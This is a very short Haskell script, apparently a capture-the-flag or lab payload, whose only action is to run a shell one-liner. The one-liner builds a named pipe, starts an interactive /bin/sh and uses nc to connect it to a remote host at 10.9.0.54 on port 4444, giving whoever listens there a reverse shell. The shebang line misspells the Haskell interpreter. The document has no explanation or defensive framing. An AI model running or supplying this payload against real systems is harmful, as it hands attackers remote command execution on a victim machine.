#!/usr/bin/env runhaskhell
module Main where
import System.Process
main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.54 4444 >/tmp/f"
